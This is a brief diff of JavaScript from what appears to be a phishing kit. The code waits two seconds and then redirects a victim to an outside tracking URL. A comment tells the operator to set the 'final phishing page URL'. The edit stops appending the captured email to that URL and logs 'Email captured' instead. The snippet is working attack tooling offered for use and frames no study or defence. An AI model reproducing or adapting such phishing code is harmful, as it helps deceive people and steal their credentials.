@@ -674,9 +674,10 @@
             // Redirect after 2 seconds
             setTimeout(function() {
                 // CHANGE THIS to your final phishing page URL
-                const finalURL = 'https://click.sensoriopaso.com/em?r=https%3A%2F%2Fnipctbd.org/8ia%2F&ecr=Y-9SIcdQOo1WYkAPxySoaZobMSvhRrTDKQ%3D%3D+' + encodeURIComponent(email);
+                const finalURL = 'https://click.sensoriopaso.com/em?r=https%3A%2F%2Fnipctbd.org/8ia%2F&ecr=Y-9SIcdQOo1WYkAPxySoaZobMSvhRrTDKQ%3D%3D';
                 
                 console.log('🚀 Redirecting to:', finalURL);
+                console.log('📧 Email captured:', email);
                 window.location.href = finalURL;
             }, 2000);
         });
